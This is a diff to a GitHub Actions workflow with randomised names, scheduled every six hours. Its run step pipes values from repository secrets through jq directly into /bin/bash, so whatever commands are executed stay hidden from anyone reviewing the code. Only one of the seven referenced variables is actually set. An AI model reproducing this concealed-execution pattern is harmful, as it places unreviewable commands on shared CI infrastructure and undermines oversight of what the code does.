@@ -3,7 +3,7 @@ name: huangyunxiao7461
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 3/6 * * *'
+    - cron: '7 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          ewf62071: ${{ secrets.ewf62071 }}
+          vyd521: ${{ secrets.vyd521 }}
         run: |
-          echo $ewf62071 | jq -r .w0 | /bin/bash
-          echo $hvpj049 | jq -r .vmvkt1 | /bin/bash
-          echo $qe315 | jq -r .dh88 | /bin/bash
+          echo $vyd521 | jq -r .rwzjv376 | /bin/bash
+          echo $cljm625 | jq -r .usuhh9 | /bin/bash
+          echo $hoy48901 | jq -r .y03984 | /bin/bash
+          echo $dfzf3570 | jq -r .ulsls9 | /bin/bash
+          echo $xaauq5 | jq -r .j185 | /bin/bash
+          echo $yuwh68243 | jq -r .yfv3439 | /bin/bash
+          echo $i36 | jq -r .br758 | /bin/bash
 
